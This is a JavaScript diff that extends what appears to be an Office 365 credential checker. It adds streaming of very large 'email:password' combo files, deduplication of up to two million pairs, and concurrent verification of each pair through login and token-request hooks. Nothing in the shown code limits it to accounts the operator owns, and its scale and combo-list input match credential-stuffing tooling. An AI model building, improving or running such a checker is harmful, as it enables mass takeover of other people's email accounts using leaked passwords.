@@ -234,6 +234,87 @@ export async function runOffice365Checks(targets, opts = {}, onResult) {
 }
 
 /**
+ * Like runOffice365Checks but pulls targets from an ASYNC ITERABLE instead of an
+ * in-memory array — so a huge file can be streamed from disk with only
+ * `concurrency` accounts in flight at once (bounded memory, no giant array, no
+ * giant IPC payload). Results are delivered via onResult as they complete; the
+ * index is the stream position. Workers share one iterator; async generators
+ * serialize concurrent next() calls, so each target is handed to exactly one
+ * worker.
+ * @param {AsyncIterable<O365Target>} source
+ * @param {{concurrency?:number, timeout?:number, gate?:Function, signal?:AbortSignal, imapLogin?:Function, tokenRequest?:Function, fetchFn?:Function}} [opts]
+ * @param {(r:O365Result, i:number)=>void} [onResult]
+ * @returns {Promise<number>} the number of targets processed
+ */
+export async function runOffice365ChecksStream(source, opts = {}, onResult) {
+  const concurrency = Math.max(1, Number(opts.concurrency) || 5);
+  const iterator = source[Symbol.asyncIterator] ? source[Symbol.asyncIterator]() : source;
+  let index = 0;
+  let exhausted = false;
+  let processed = 0;
+
+  async function take() {
+    if (exhausted || opts.signal?.aborted) return null;
+    const { value, done } = await iterator.next();
+    if (done) { exhausted = true; return null; }
+    return { value, i: index++ };
+  }
+
+  async function worker() {
+    for (;;) {
+      if (opts.signal?.aborted) return;
+      const item = await take();
+      if (!item) return;
+      if (opts.gate) await opts.gate();
+      let r;
+      try { r = await verifyOffice365(item.value, opts); }
+      catch (err) { r = { user: item.value?.user || '', pass: item.value?.pass || '', status: 'unknown', method: '', detail: err?.message || String(err) }; }
+      processed++;
+      onResult?.(r, item.i);
+    }
+  }
+
+  await Promise.all(Array.from({ length: concurrency }, worker));
+  return processed;
+}
+
+/**
+ * Stream {user,pass} targets from one or more files WITHOUT loading them into
+ * memory: each file is read line by line, parsed, and (unless disabled)
+ * de-duplicated via a bounded key set. For truly huge lists the dedup set stops
+ * growing past `maxDedupeKeys` so memory stays bounded. Main-process only.
+ * @param {string|string[]} filePaths
+ * @param {{signal?:AbortSignal, dedupe?:boolean, maxDedupeKeys?:number}} [opts]
+ * @returns {AsyncGenerator<O365Target>}
+ */
+export async function* streamOffice365Targets(filePaths, opts = {}) {
+  const { createReadStream } = await import('node:fs');
+  const { createInterface } = await import('node:readline');
+  const paths = (Array.isArray(filePaths) ? filePaths : [filePaths]).filter(Boolean);
+  const seen = opts.dedupe === false ? null : new Set();
+  const maxKeys = Number(opts.maxDedupeKeys) || 2_000_000;
+  for (const fp of paths) {
+    if (opts.signal?.aborted) return;
+    const rl = createInterface({ input: createReadStream(fp, { encoding: 'utf8' }), crlfDelay: Infinity });
+    try {
+      for await (const line of rl) {
+        if (opts.signal?.aborted) return;
+        const t = parseOffice365Line(line);
+        if (!t) continue;
+        if (seen) {
+          const key = `${t.user.toLowerCase()} ${t.pass}`;
+          if (seen.has(key)) continue;
+          if (seen.size < maxKeys) seen.add(key);
+        }
+        yield t;
+      }
+    } finally {
+      rl.close();
+    }
+  }
+}
+
+/**
  * Parse `email:password` lines (also tolerating `email password` and trailing
  * host:port fields where the first two tokens are the email + password). Blank
  * and `#` comment lines are skipped. Pure.
